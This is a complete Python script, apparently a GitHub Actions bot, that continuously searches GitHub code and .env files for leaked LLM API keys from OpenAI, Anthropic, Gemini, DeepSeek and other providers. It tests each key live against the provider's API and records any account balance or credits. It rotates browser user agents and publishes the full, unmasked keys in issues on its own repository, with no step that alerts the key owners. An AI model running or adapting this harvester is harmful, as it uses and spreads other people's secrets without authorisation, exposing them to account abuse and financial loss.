#!/usr/bin/env python3
"""
API Key Leak Scanner v2 — Rate-limited, time-partitioned, scan-only.
- Shared token-bucket rate limiter eliminates 403 backoff
- Time-partitioned queries bypass the 1000-result ceiling
- All known LLM key patterns covered in search queries
- Scan + verify + write files — no posting to any repo
"""

import os
import re
import sys
import json
import ssl
import jwt
import time
import signal
import random
import requests
import urllib.parse
import urllib.request
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Tuple, Dict
from github import Github, Auth

# ============================
#  Configuration
# ============================
MAX_RUNTIME_SECONDS = 5.9 * 3600   # GitHub Actions job limit is 6h, leave 6min buffer
RATE_LIMIT_CALLS = 15              # conservative — well under 30/min, no burst
REQUEST_TIMEOUT = 15
PER_PAGE = 30
VERIFY_WORKERS = 30
SEARCH_WORKERS = 2             # fewer concurrent searchers → less burst
CACHE_SIZE = 500
CACHE_TTL = 1800                   # 30min TTL (shorter since we scan continuously)

# Continuous-loop tuning
CYCLE_LOOKBACK_MINUTES = 15        # each cycle searches this many minutes back
CYCLE_SLEEP_SECONDS = 240          # sleep 4min between cycles → ~10 cycles/hour

APP_ID = os.environ.get("APP_ID")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")
INSTALLATION_ID = os.environ.get("INSTALLATION_ID")
PAT_TOKEN = os.environ.get("PAT_TOKEN") or os.environ.get("GITHUB_TOKEN")
OWN_REPO = os.environ.get("GITHUB_REPOSITORY", "unknown/unknown")
GITHUB_API = "https://api.github.com"

start_time = time.time()
stop_event = threading.Event()
print_lock = threading.Lock()

# ============================
#  Rate Limiter (token bucket)
# ============================
class RateLimiter:
    def __init__(self, calls_per_minute=RATE_LIMIT_CALLS):
        self.rate = calls_per_minute / 60.0
        self.max_tokens = float(calls_per_minute)
        self.tokens = 1.0               # cold start — 1st request immediate, then paced
        self.lock = threading.Lock()
        self.last_refill = time.time()
        self.total_waited = 0.0

    def acquire(self):
        with self.lock:
            now = time.time()
            elapsed = now - self.last_refill
            self.tokens = min(self.max_tokens, self.tokens + elapsed * self.rate)
            self.last_refill = now
            if self.tokens >= 1.0:
                self.tokens -= 1.0
                return 0.0
            wait = (1.0 - self.tokens) / self.rate
            self.total_waited += wait
            self.tokens = 0.0
            self.last_refill = time.time()
            return wait

    def stats(self):
        with self.lock:
            return f"tokens={self.tokens:.1f}, waited={self.total_waited:.1f}s"

rate_limiter = RateLimiter()

# ============================
#  User-Agent pool
# ============================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

def random_ua():
    return random.choice(USER_AGENTS)

# ============================
#  Key patterns (regex for extraction from content)
# ============================
# Pattern order matters! Specific sk-* prefixes must come BEFORE the generic
# sk- catch-all (OpenAI_Legacy / DeepSeek). Python 3.7+ preserves dict order.
KEY_PATTERNS = {
    "OpenAI":        re.compile(r"sk-proj-[a-zA-Z0-9_\-]{50,}"),
    "OpenRouter":    re.compile(r"sk-or-v1-[a-zA-Z0-9]{50,}"),
    "Anthropic":     re.compile(r"sk-ant-api[0-9A-Za-z\-_]{40,}"),
    "MiniMax":       re.compile(r"sk-api-[a-zA-Z0-9]{100,}"),
    "XAI":           re.compile(r"xai-[a-zA-Z0-9]{32,}"),
    "Gemini":        re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "Replicate":     re.compile(r"r8_[a-zA-Z0-9]{32,}"),
    "HuggingFace":   re.compile(r"hf_[a-zA-Z0-9]{30,}"),
    "MiMo":          re.compile(r"tp-[a-zA-Z0-9]{10,}"),
    # These two share the same pattern — cross-verify resolves ambiguity
    "OpenAI_Legacy": re.compile(r"sk-[a-zA-Z0-9]{32,}"),
    "DeepSeek":      re.compile(r"sk-[a-zA-Z0-9]{32,}"),
}

# ---- Search queries (one union string per search type) ----
# These must contain every token that could appear in a key so GitHub Search returns the file.
CODE_KEYWORDS = " OR ".join([
    "sk-proj-", "sk-", "sk-or-v1-", "xai-", "AIza", "sk-ant-api",
    "r8_", "hf_", "tp-", "sk-api-",
])
ENV_KEYWORDS = " OR ".join([
    "sk-", "sk-proj-", "sk-or-v1-", "xai-", "AIza", "sk-ant-api",
    "r8_", "hf_", "tp-", "sk-api-",
])

# ============================
#  Verification callbacks
# ============================
def _parse_deepseek(code, data):
    if code != 200:
        return False, 0, f"HTTP {code}"
    if not isinstance(data, dict):
        return False, 0, "Invalid response"
    if data.get("is_available", False):
        cny = sum(float(i.get("total_balance", 0)) for i in data.get("balance_infos", []) if i.get("currency") == "CNY")
        usd = sum(float(i.get("total_balance", 0)) for i in data.get("balance_infos", []) if i.get("currency") == "USD")
        info = f"CNY {cny:.2f}, USD {usd:.2f}" if cny or usd else "Valid (no balance)"
        return True, cny + usd * 7.2, info
    return False, 0, "Invalid"

def _parse_openai(code, data):
    if code == 200: return True, 0, "Valid"
    if code == 401: return False, 0, "Invalid"
    if code == 429: return True, 0, "Rate limited (key may be valid)"
    return False, 0, f"HTTP {code}"

def _parse_openrouter(code, data):
    if code == 200:
        credits = data.get("credits", 0) if isinstance(data, dict) else 0
        info = f"Credits: {credits}" if credits > 0 else "Valid (no credits)"
        return True, float(credits), info
    return False, 0, f"HTTP {code}"

def _parse_xai(code, data):
    if code == 200: return True, 0, "Valid"
    if code == 401: return False, 0, "Invalid"
    return False, 0, f"HTTP {code}"

def _parse_gemini(code, data):
    if code == 200: return True, 0, "Valid"
    if code == 403: return True, 0, "Valid but restricted (IP/region/billing)"
    if code == 400:
        if isinstance(data, dict) and "API key not valid" in str(data):
            return False, 0, "Invalid key"
        return True, 0, "Possibly valid (check billing)"
    if code == 404: return False, 0, "Invalid (not found)"
    if code == 429: return True, 0, "Rate limited (key may be valid)"
    return False, 0, f"HTTP {code}"

def _parse_anthropic(code, data):
    return (True, 0, "Valid") if code == 200 else (False, 0, f"HTTP {code}")

def _parse_replicate(code, data):
    return (True, 0, "Valid") if code == 200 else (False, 0, f"HTTP {code}")

def _parse_huggingface(code, data):
    return (True, 0, "Valid") if code == 200 else (False, 0, f"HTTP {code}")

def _parse_mimo(code, data):
    if code == 200:
        balance = float(data.get("balance", data.get("credit", 0))) if isinstance(data, dict) else 0
        info = f"Balance: {balance}" if balance > 0 else "Valid"
        return True, balance, info
    return False, 0, f"HTTP {code}"

def _parse_minimax(code, data):
    if code == 200: return True, 0, "Valid"
    if code == 401: return False, 0, "Invalid"
    return False, 0, f"HTTP {code}"

VERIFIERS = {
    "OpenAI":        {"url": "https://api.openai.com/v1/models",                 "headers": lambda k: {"Authorization": f"Bearer {k}"}, "method": "GET",  "parse": _parse_openai},
    "OpenAI_Legacy": {"url": "https://api.openai.com/v1/models",                 "headers": lambda k: {"Authorization": f"Bearer {k}"}, "method": "GET",  "parse": _parse_openai},
    "OpenRouter":    {"url": "https://openrouter.ai/api/v1/auth/key",            "headers": lambda k: {"Authorization": f"Bearer {k}"}, "method": "GET",  "parse": _parse_openrouter},
    "XAI":           {"url": "https://api.x.ai/v1/models",                       "headers": lambda k: {"Authorization": f"Bearer {k}"}, "method": "GET",  "parse": _parse_xai},
    "DeepSeek":      {"url": "https://api.deepseek.com/user/balance",            "headers": lambda k: {"Authorization": f"Bearer {k}", "Accept": "application/json"}, "method": "GET", "parse": _parse_deepseek},
    "Gemini":        {"url": lambda k: f"https://generativelanguage.googleapis.com/v1/models?key={k}", "headers": lambda k: {}, "method": "GET", "parse": _parse_gemini},
    "Anthropic":     {"url": "https://api.anthropic.com/v1/messages",            "headers": lambda k: {"x-api-key": k, "anthropic-version": "2023-06-01", "Content-Type": "application/json"}, "method": "POST",
                      "body": lambda: json.dumps({"model": "claude-3-haiku-20240307", "max_tokens": 1, "messages": [{"role": "user", "content": "hi"}]}).encode(), "parse": _parse_anthropic},
    "Replicate":     {"url": "https://api.replicate.com/v1/account",             "headers": lambda k: {"Authorization": f"Bearer {k}"}, "method": "GET",  "parse": _parse_replicate},
    "HuggingFace":   {"url": "https://huggingface.co/api/whoami",               "headers": lambda k: {"Authorization": f"Bearer {k}"}, "method": "GET",  "parse": _parse_huggingface},
    "MiMo":          {"url": "https://token-plan-cn.xiaomimimo.com/v1/models",   "headers": lambda k: {"Authorization": f"Bearer {k}", "X-Plan-Type": "token-plan"}, "method": "GET", "parse": _parse_mimo},
    "MiniMax":       {"url": "https://api.minimax.io/v1/models",                 "headers": lambda k: {"Authorization": f"Bearer {k}"}, "method": "GET",  "parse": _parse_minimax},
}

# ============================
#  GitHub auth
# ============================
def get_github_client():
    if APP_ID and PRIVATE_KEY and INSTALLATION_ID:
        try:
            payload = {"iat": int(time.time()), "exp": int(time.time()) + 600, "iss": APP_ID}
            jwt_token = jwt.encode(payload, PRIVATE_KEY, algorithm="RS256")
            url = f"https://api.github.com/app/installations/{INSTALLATION_ID}/access_tokens"
            headers = {"Authorization": f"Bearer {jwt_token}", "Accept": "application/vnd.github+json"}
            resp = requests.post(url, headers=headers, timeout=10)
            if resp.status_code == 201:
                print("Auth: GitHub App")
                return Github(auth=Auth.Token(resp.json()["token"]), retry=0)
        except Exception as e:
            print(f"GitHub App auth failed: {e}")
    if PAT_TOKEN:
        print("Auth: PAT")
        return Github(auth=Auth.Token(PAT_TOKEN), retry=0)
    print("No auth available")
    return None

# ============================
#  Helpers
# ============================
def safe_print(msg):
    with print_lock:
        print(msg, flush=True)

def gh_headers():
    headers = {"Accept": "application/vnd.github+json", "User-Agent": random_ua()}
    if PAT_TOKEN:
        headers["Authorization"] = f"Bearer {PAT_TOKEN}"
    return headers

def gh_api_get(url, timeout=REQUEST_TIMEOUT):
    """GitHub API GET with rate limiter. Returns (status_code, data)."""
    wait = rate_limiter.acquire()
    if wait > 0.5:
        safe_print(f"  ⏳ Rate-limited: waited {wait:.1f}s (bucket: {rate_limiter.stats()})")
    try:
        req = urllib.request.Request(url, headers=gh_headers(), method="GET")
        ctx = ssl.create_default_context()
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read().decode("utf-8")
            try:
                return resp.status, json.loads(raw)
            except Exception:
                return resp.status, raw
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8")[:200]
        except Exception:
            pass
        if e.code == 403 and "rate limit" in body.lower():
            safe_print(f"  ⚠️ Unexpected 403 rate-limit despite limiter! Body: {body}")
        return e.code, body
    except Exception as e:
        return 0, str(e)

# ============================
#  Cache
# ============================
_content_cache: Dict[str, Tuple[str, float]] = {}
_cache_lock = threading.Lock()

def cache_get(key):
    with _cache_lock:
        entry = _content_cache.get(key)
        if entry:
            content, ts = entry
            if time.time() - ts < CACHE_TTL:
                return content
            del _content_cache[key]
    return None

def cache_set(key, content):
    with _cache_lock:
        if len(_content_cache) > CACHE_SIZE:
            stale = sorted(_content_cache.items(), key=lambda x: x[1][1])
            for key, _ in stale[:len(_content_cache) - CACHE_SIZE]:
                del _content_cache[key]
        _content_cache[key] = (content, time.time())

# ============================
#  Content fetchers
# ============================
def fetch_raw_file(source_url):
    cached = cache_get(source_url)
    if cached:
        return cached
    raw_url = source_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    try:
        resp = requests.get(raw_url, headers={"User-Agent": random_ua()}, timeout=10)
        if resp.status_code == 200:
            cache_set(source_url, resp.text)
            return resp.text
    except Exception:
        pass
    return None

def fetch_issue_body(g, source_url):
    cached = cache_get(source_url)
    if cached:
        return cached
    try:
        parts = source_url.replace("https://github.com/", "").split("/issues/")
        if len(parts) != 2:
            return None
        repo = g.get_repo(parts[0])
        issue = repo.get_issue(number=int(parts[1]))
        content = f"# {issue.title}\n\n{issue.body or ''}"
        cache_set(source_url, content)
        return content
    except Exception:
        return None

def fetch_pr_body(g, source_url):
    cached = cache_get(source_url)
    if cached:
        return cached
    try:
        parts = source_url.replace("https://github.com/", "").split("/pull/")
        if len(parts) != 2:
            return None
        repo = g.get_repo(parts[0])
        pr = repo.get_pull(number=int(parts[1]))
        content = f"# {pr.title}\n\n{pr.body or ''}"
        try:
            diff_url = f"https://patch-diff.githubusercontent.com/raw/{parts[0]}/pull/{int(parts[1])}.diff"
            resp = requests.get(diff_url, headers={"User-Agent": random_ua()}, timeout=10)
            if resp.status_code == 200:
                content += f"\n\n{resp.text}"
        except Exception:
            pass
        cache_set(source_url, content)
        return content
    except Exception:
        return None

def fetch_commit_diff(g, source_url):
    cached = cache_get(source_url)
    if cached:
        return cached
    try:
        parts = source_url.replace("https://github.com/", "").split("/commit/")
        if len(parts) != 2:
            return None
        repo = g.get_repo(parts[0])
        commit = repo.get_commit(sha=parts[1])
        content = commit.commit.message or ""
        for f in commit.files:
            if f.patch:
                content += f"\n{f.patch}"
        cache_set(source_url, content)
        return content
    except Exception:
        return None

# ============================
#  Dedup
# ============================
_seen_keys: set = set()
_seen_combos: set = set()
_seen_lock = threading.Lock()

def is_duplicate(key, source_url):
    combo = f"{key}|{source_url}"
    with _seen_lock:
        if key in _seen_keys or combo in _seen_combos:
            return True
        _seen_keys.add(key)
        _seen_combos.add(combo)
    return False

# Patterns whose regexes can match the same key string — when the first-guess
# service fails verification, the key is re-tried against every other service
# in the same group.
CROSS_VERIFY_GROUPS = [
    {"OpenAI_Legacy", "DeepSeek"},       # both match sk-[a-zA-Z0-9]{32,}
]

def _build_cross_verify_map():
    m = {}
    for group in CROSS_VERIFY_GROUPS:
        for svc in group:
            m[svc] = [s for s in group if s != svc]
    return m

CROSS_VERIFY_MAP = _build_cross_verify_map()

# ============================
#  Key extraction
# ============================
def extract_keys(text, source_url, source_type, g):
    """Pull full content if needed, then run all regexes. Returns list of (key, service, source_url, source_type)."""
    results = []

    # Enrich content based on source type
    if source_type == "code":
        enriched = fetch_raw_file(source_url)
        if enriched:
            text = enriched
    elif source_type == "issue":
        enriched = fetch_issue_body(g, source_url)
        if enriched:
            text = enriched
    elif source_type == "pr":
        enriched = fetch_pr_body(g, source_url)
        if enriched:
            text = enriched
    elif source_type == "commit":
        enriched = fetch_commit_diff(g, source_url)
        if enriched:
            text = enriched

    for service, pattern in KEY_PATTERNS.items():
        for match in pattern.finditer(text):
            key = match.group(0)
            results.append((key, service, source_url, source_type))

    return results

# ============================
#  Verification
# ============================
found_valid = []
found_lock = threading.Lock()

def _call_verifier(key, service):
    """Make a single verification request. Returns (valid, balance, info)."""
    verifier = VERIFIERS.get(service)
    if not verifier:
        return (False, 0, "Unsupported")
    url = verifier["url"](key) if callable(verifier["url"]) else verifier["url"]
    headers = verifier["headers"](key)
    headers["User-Agent"] = random_ua()
    body = verifier.get("body")
    if body:
        body = body()
    if verifier["method"] == "GET":
        resp = requests.get(url, headers=headers, timeout=8)
    else:
        resp = requests.post(url, headers=headers, data=body, timeout=8)
    data = resp.json() if resp.headers.get("content-type", "").startswith("application/json") and resp.text else None
    return verifier["parse"](resp.status_code, data)

def verify_one(key, service, source_url, source_type):
    """Verify a key against its classified service. If it fails and the key prefix
    is ambiguous (e.g. 'sk-' matches both OpenAI and DeepSeek), try alternatives."""
    try:
        valid, balance, info = _call_verifier(key, service)
        if valid:
            return (key, service, valid, balance, info, source_url, source_type)

        # Cross-verify: key failed for the first-guess service, try alternatives
        alternatives = CROSS_VERIFY_MAP.get(service, [])
        for alt_service in alternatives:
            alt_valid, alt_balance, alt_info = _call_verifier(key, alt_service)
            if alt_valid:
                safe_print(f"      ↳ Cross-verified as {alt_service} (was classified as {service})")
                return (key, alt_service, alt_valid, alt_balance, alt_info, source_url, source_type)

        return (key, service, valid, balance, info, source_url, source_type)
    except Exception as e:
        return (key, service, False, 0, f"Error: {str(e)[:40]}", source_url, source_type)

def verify_batch(batch):
    """Verify a batch of keys concurrently. Returns list of valid results."""
    if not batch:
        return []
    safe_print(f"  🔍 Verifying {len(batch)} keys...")
    valid = []
    with ThreadPoolExecutor(max_workers=VERIFY_WORKERS) as executor:
        futures = {executor.submit(verify_one, *item): item for item in batch}
        for future in as_completed(futures):
            try:
                key, service, ok, balance, info, source_url, source_type = future.result(timeout=20)
                masked = key[:14] + "..." + key[-6:] if len(key) > 24 else key
                if ok:
                    safe_print(f"    ✅ [{service}] {masked} — {info} — {source_url[:80]}")
                    valid.append((key, service, balance, info, source_url, source_type))
                else:
                    safe_print(f"    ❌ [{service}] {masked} — {info}")
            except Exception as e:
                safe_print(f"    ⚠️ Verify exception: {e}")
    return valid

# ============================
#  Search workers
def search_code():
    """Search GitHub code — sorted by indexed, newest first."""
    query = CODE_KEYWORDS
    total = 0
    page = 1
    consecutive_empty = 0
    while not stop_event.is_set() and consecutive_empty < 3:
        url = f"{GITHUB_API}/search/code?q={urllib.parse.quote(query)}&sort=indexed&order=desc&per_page={PER_PAGE}&page={page}"
        code, data = gh_api_get(url)
        if code == 403:
            safe_print(f"  CODE 403 p{page}, stopping")
            break
        if code != 200:
            safe_print(f"  CODE HTTP {code} p{page}  URL: {url[:150]}")
            page += 1
            continue
        items = data.get("items", []) if isinstance(data, dict) else []
        if not items:
            consecutive_empty += 1
            page += 1
            continue
        consecutive_empty = 0
        safe_print(f"  📄 CODE p{page}: {len(items)} (total: {total})")
        for item in items:
            html_url = item.get("html_url", "")
            owner = item.get("repository", {}).get("owner", {}).get("login", "unknown")
            yield (html_url, owner, "code")
            total += 1
        page += 1

def search_env_files():
    """Search .env / config files — simple query, code search."""
    query = f"{ENV_KEYWORDS} filename:.env"
    total = 0
    page = 1
    consecutive_empty = 0
    while not stop_event.is_set() and consecutive_empty < 3:
        url = f"{GITHUB_API}/search/code?q={urllib.parse.quote(query)}&per_page={PER_PAGE}&page={page}"
        code, data = gh_api_get(url)
        if code == 403:
            safe_print(f"  ENV 403 p{page}, stopping")
            break
        if code != 200:
            safe_print(f"  ENV HTTP {code} p{page}  URL: {url[:150]}")
            page += 1
            continue
        items = data.get("items", []) if isinstance(data, dict) else []
        if not items:
            consecutive_empty += 1
            page += 1
            continue
        consecutive_empty = 0
        safe_print(f"  📁 ENV p{page}: {len(items)} (total: {total})")
        for item in items:
            html_url = item.get("html_url", "")
            owner = item.get("repository", {}).get("owner", {}).get("login", "unknown")
            yield (html_url, owner, "env")
            total += 1
        page += 1

# ============================
#  Result writer
# ============================
def post_issue_to_own_repo(g, cycle_new_keys):
    """Create a single issue in the bot's own repo summarizing this cycle's finds."""
    if not cycle_new_keys or not g:
        return
    try:
        repo = g.get_repo(OWN_REPO)
        lines = []
        for key, service, balance, info, source_url, source_type in cycle_new_keys:
            balance_str = f" (Balance: {balance})" if balance else ""
            lines.append(
                f"| {service} | `{key}` | {info}{balance_str} | "
                f"[{source_type}]({source_url}) |"
            )

        body = (
            f"## 🔑 {len(cycle_new_keys)} new API key leak(s) detected\n\n"
            f"| Service | Key | Status | Source |\n"
            f"|---------|-----|--------|--------|\n"
            + "\n".join(lines)
            + f"\n\n---\n*{datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}* | Auto-scanned by [LLMApiCheckBot](https://github.com/{OWN_REPO})"
        )
        issue = repo.create_issue(
            title=f"🔑 {len(cycle_new_keys)} key leak(s) — {datetime.now().strftime('%m-%d %H:%M')}",
            body=body,
        )
        safe_print(f"  📮 Created issue #{issue.number} in {OWN_REPO}")
    except Exception as e:
        safe_print(f"  ⚠️ Failed to create issue: {e}")

def write_cycle_results(cycle_new_keys, g=None):
    """Write incremental results each cycle + always-latest snapshot."""
    if not cycle_new_keys:
        return
    # Append to running log
    with open("valid_keys_all.txt", "a", encoding="utf-8") as f:
        for key, service, balance, info, source_url, source_type in cycle_new_keys:
            masked = key[:14] + "..." + key[-6:] if len(key) > 24 else key
            f.write(f"{datetime.now().strftime('%H:%M:%S')} | {service:15s} | {masked:30s} | {info:30s} | {source_type:8s} | {source_url}\n")
    # Overwrite latest snapshot
    with open("valid_keys_latest.txt", "w", encoding="utf-8") as f:
        for key, service, balance, info, source_url, source_type in found_valid:
            masked = key[:14] + "..." + key[-6:] if len(key) > 24 else key
            f.write(f"{service:15s} | {masked:30s} | {info:30s} | {source_type:8s} | {source_url}\n")
    # Post issue to own repo
    post_issue_to_own_repo(g, cycle_new_keys)

def write_final_results():
    """Write final summary at end of run."""
    if not found_valid:
        safe_print("\n📭 No valid keys found this entire run.")
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"valid_keys_{timestamp}.txt"
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"# Scan completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
        f.write(f"# Rate limiter stats: {rate_limiter.stats()}\n")
        f.write(f"# Total valid keys: {len(found_valid)}\n\n")
        for key, service, balance, info, source_url, source_type in found_valid:
            masked = key[:14] + "..." + key[-6:] if len(key) > 24 else key
            f.write(f"{service:15s} | {masked:30s} | {info:30s} | {source_type:8s} | {source_url}\n")
    safe_print(f"\n💾 Final: {len(found_valid)} valid keys → {path}")

# ============================
#  Signal handler
# ============================
def signal_handler(sig, frame):
    safe_print("\n⚠️ Interrupted, saving results...")
    stop_event.set()
    write_final_results()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ============================
#  Main
# ============================
_cycle_count = 0

def run_cycle(g):
    """One scan cycle: search, extract, verify, write. Returns number of new valid keys."""
    global _cycle_count
    _cycle_count += 1
    cycle_start = time.time()

    safe_print(f"\n{'━' * 60}")
    safe_print(f"🔄 Cycle #{_cycle_count} — {datetime.now().strftime('%H:%M:%S')}")
    safe_print(f"   Lookback: {CYCLE_LOOKBACK_MINUTES}min  |  Rate limiter: {rate_limiter.stats()}")
    safe_print(f"{'━' * 60}")

    # ---- Search & extract ----
    all_candidates = []
    search_tasks = [
        ("CODE", lambda: search_code()),
        ("ENV",  lambda: search_env_files()),
    ]

    with ThreadPoolExecutor(max_workers=SEARCH_WORKERS) as executor:
        futures = {}
        for name, fn in search_tasks:
            futures[executor.submit(lambda n=name, f=fn: (n, list(f())))] = name

        for future in as_completed(futures):
            if stop_event.is_set():
                return 0
            try:
                name, items = future.result()
                for source_url, author, source_type in items:
                    extracted = extract_keys("", source_url, source_type, g)
                    for key, service, src_url, src_type in extracted:
                        if not is_duplicate(key, src_url):
                            all_candidates.append((key, service, src_url, src_type))
            except Exception as e:
                safe_print(f"  [{name}] error: {e}")

    new_valid_this_cycle = []

    if all_candidates:
        # ---- Verify ----
        batches = [all_candidates[i:i + PER_PAGE] for i in range(0, len(all_candidates), PER_PAGE)]
        for batch in batches:
            if stop_event.is_set():
                break
            valid = verify_batch(batch)
            with found_lock:
                found_valid.extend(valid)
                new_valid_this_cycle.extend(valid)

        # ---- Write incremental results ----
        write_cycle_results(new_valid_this_cycle, g)

    elapsed = time.time() - cycle_start
    safe_print(f"  ⏱️  Cycle #{_cycle_count} done in {elapsed:.0f}s — "
               f"{len(all_candidates)} candidates, {len(new_valid_this_cycle)} new valid "
               f"(total valid: {len(found_valid)})")

    return len(new_valid_this_cycle)

def main():
    print("=" * 70)
    print("API Key Leak Scanner v2 — Continuous 24/7 mode")
    print(f"Rate limit: {RATE_LIMIT_CALLS}/min  |  Lookback: {CYCLE_LOOKBACK_MINUTES}min/cycle")
    print(f"Cycle sleep: {CYCLE_SLEEP_SECONDS}s  |  Max runtime: {MAX_RUNTIME_SECONDS:.0f}s ({MAX_RUNTIME_SECONDS/3600:.1f}h)")
    print(f"Coverage: OpenAI / DeepSeek / OpenRouter / XAI / Gemini / Anthropic / Replicate / HF / MiMo / MiniMax")
    print("=" * 70)

    g = get_github_client()
    if not g:
        print("❌ No GitHub auth. Set GITHUB_TOKEN (auto in Actions) or PAT_TOKEN.")
        return

    # Initialize header for the all-keys log
    with open("valid_keys_all.txt", "w", encoding="utf-8") as f:
        f.write(f"# Continuous scan started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
        f.write(f"# Cycle lookback: {CYCLE_LOOKBACK_MINUTES}min, sleep: {CYCLE_SLEEP_SECONDS}s\n\n")

    try:
        while not stop_event.is_set():
            # Check global timeout
            if time.time() - start_time >= MAX_RUNTIME_SECONDS:
                safe_print(f"\n⏰ Max runtime ({MAX_RUNTIME_SECONDS:.0f}s) reached. Shutting down.")
                break

            run_cycle(g)

            # Sleep until next cycle
            remaining = MAX_RUNTIME_SECONDS - (time.time() - start_time)
            sleep_time = min(CYCLE_SLEEP_SECONDS, remaining)
            if sleep_time <= 0:
                break

            safe_print(f"\n💤 Sleeping {sleep_time:.0f}s until next cycle... "
                       f"(job remaining: {remaining:.0f}s)")
            slept = 0
            while slept < sleep_time and not stop_event.is_set():
                time.sleep(min(5, sleep_time - slept))
                slept += 5
    except KeyboardInterrupt:
        pass
    finally:
        safe_print("\n🛑 Scan loop ended.")
        write_final_results()
        elapsed = time.time() - start_time
        safe_print(f"\n✅ {_cycle_count} cycles in {elapsed:.0f}s. "
                   f"Total valid keys: {len(found_valid)}. "
                   f"Rate limiter: {rate_limiter.stats()}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"❌ Fatal: {e}")
        write_final_results()
        sys.exit(1)
